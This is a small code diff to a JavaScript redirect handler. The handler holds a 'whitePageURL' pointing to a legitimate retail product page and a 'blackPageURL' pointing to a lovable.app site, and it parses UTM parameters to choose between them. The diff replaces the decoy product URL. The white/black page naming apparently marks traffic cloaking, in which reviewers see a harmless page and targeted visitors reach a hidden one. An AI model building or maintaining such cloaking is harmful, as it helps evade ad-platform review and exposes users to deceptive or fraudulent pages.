@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://smartphonesshop.com.au/products/kingleen-c858-a-c-charger";
+    const whitePageURL = "https://www.auspowerbanks.com.au/product/nitecore-nw5000-carbon-fibre-magnetic-wireless-power-bank/";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
